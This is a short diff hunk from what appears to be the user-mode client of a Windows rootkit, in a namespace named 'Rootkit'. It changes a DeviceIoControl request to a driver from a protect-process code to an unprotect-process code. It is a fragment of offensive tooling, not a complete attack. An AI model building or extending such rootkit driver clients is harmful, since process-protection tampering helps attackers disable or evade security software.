@@ -52,7 +52,7 @@ namespace Rootkit {
         r.process_id = UlongToHandle(pid);
         return DeviceIoControl(
             driver_handle,
-            codes::ProtectProcessOP,
+            codes::UnProtectProcessOP,
             &r,
             sizeof(r),
             &r,
